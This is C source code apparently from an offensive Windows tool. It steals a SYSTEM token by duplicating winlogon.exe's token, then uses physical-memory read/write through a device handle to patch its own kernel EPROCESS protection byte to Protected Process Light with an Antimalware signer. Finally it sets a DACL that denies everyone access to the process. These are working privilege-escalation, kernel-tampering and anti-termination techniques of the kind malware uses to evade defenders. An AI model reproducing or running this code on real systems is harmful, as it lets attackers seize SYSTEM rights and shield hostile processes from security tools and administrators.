#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <aclapi.h>
#include "syscalls.h"
#include "symbols.h"
#include "physmem.h"
#include "protect.h"

#pragma comment(lib, "advapi32.lib")

static DWORD FindWinlogonPid() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W entry = {};
    entry.dwSize = sizeof(entry);
    if (!Process32FirstW(snapshot, &entry)) {
        CloseHandle(snapshot);
        return 0;
    }

    do {
        if (_wcsicmp(entry.szExeFile, L"winlogon.exe") == 0) {
            CloseHandle(snapshot);
            return entry.th32ProcessID;
        }
    } while (Process32NextW(snapshot, &entry));

    CloseHandle(snapshot);
    return 0;
}

bool ImpersonateSystem() {
    DWORD pid = FindWinlogonPid();
    if (!pid) return false;

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProcess) return false;

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hImpToken = NULL;
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
        SecurityImpersonation, TokenImpersonation, &hImpToken)) {
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return false;
    }

    BOOL result = SetThreadToken(NULL, hImpToken);
    CloseHandle(hImpToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);

    if (result) printf("[+] SYSTEM token acquired\n");
    return result;
}

bool SetProcessPPL(HANDLE device, SyscallTable* sc, ULONG64 systemCr3, KernelOffsets* offsets) {
    DWORD ourPid = GetCurrentProcessId();
    ULONG64 psActiveVA = offsets->NtoskrnlBase + offsets->PsActiveProcessHead;
    ULONG64 psActivePA = VirtToPhys(device, sc, systemCr3, psActiveVA);
    if (!psActivePA) return false;

    ULONG64 listHead = psActiveVA;
    ULONG64 currentLink = PhysRead64(device, sc, psActivePA);
    ULONG64 ourEprocess = 0;

    int count = 0;
    while (currentLink != listHead && currentLink != 0 && count < 500) {
        count++;
        ULONG64 eprocessVA = currentLink - offsets->ActiveProcessLinks;
        ULONG64 eprocessPA = VirtToPhys(device, sc, systemCr3, eprocessVA);
        if (!eprocessPA) break;

        ULONG64 pid = PhysRead64(device, sc, eprocessPA + offsets->UniqueProcessId);
        if ((DWORD)pid == ourPid) { ourEprocess = eprocessVA; break; }

        ULONG64 nextPA = VirtToPhys(device, sc, systemCr3, currentLink);
        if (!nextPA) break;
        currentLink = PhysRead64(device, sc, nextPA);
    }

    if (!ourEprocess) return false;

    ULONG64 protPA = VirtToPhys(device, sc, systemCr3, ourEprocess + offsets->Protection);
    if (!protPA) return false;

    BYTE ppl = 0x31; // Light + AntimalwareSigner
    PhysWriteBuffer(device, sc, protPA, &ppl, 1);
    printf("[+] PPL set (0x31)\n");
    return true;
}

bool LockProcessDACL() {
    SID_IDENTIFIER_AUTHORITY worldAuth = SECURITY_WORLD_SID_AUTHORITY;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    PSID pEveryone = NULL, pSystem = NULL;

    if (!AllocateAndInitializeSid(&worldAuth, 1, SECURITY_WORLD_RID, 0,0,0,0,0,0,0, &pEveryone))
        return false;
    if (!AllocateAndInitializeSid(&ntAuth, 1, SECURITY_LOCAL_SYSTEM_RID, 0,0,0,0,0,0,0, &pSystem)) {
        FreeSid(pEveryone);
        return false;
    }

    EXPLICIT_ACCESSW ea[2] = {};
    ea[0].grfAccessPermissions = PROCESS_ALL_ACCESS;
    ea[0].grfAccessMode = DENY_ACCESS;
    ea[0].grfInheritance = NO_INHERITANCE;
    BuildTrusteeWithSidW(&ea[0].Trustee, pEveryone);

    ea[1].grfAccessPermissions = PROCESS_ALL_ACCESS;
    ea[1].grfAccessMode = GRANT_ACCESS;
    ea[1].grfInheritance = NO_INHERITANCE;
    BuildTrusteeWithSidW(&ea[1].Trustee, pSystem);

    PACL pAcl = NULL;
    if (SetEntriesInAclW(2, ea, NULL, &pAcl) != ERROR_SUCCESS) {
        FreeSid(pEveryone); FreeSid(pSystem);
        return false;
    }

    PSECURITY_DESCRIPTOR pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
    InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(pSD, TRUE, pAcl, FALSE);

    BOOL result = SetKernelObjectSecurity(GetCurrentProcess(), DACL_SECURITY_INFORMATION, pSD);

    LocalFree(pSD);
    LocalFree(pAcl);
    FreeSid(pEveryone);
    FreeSid(pSystem);

    if (result) printf("[+] DACL locked\n");
    return result;
}
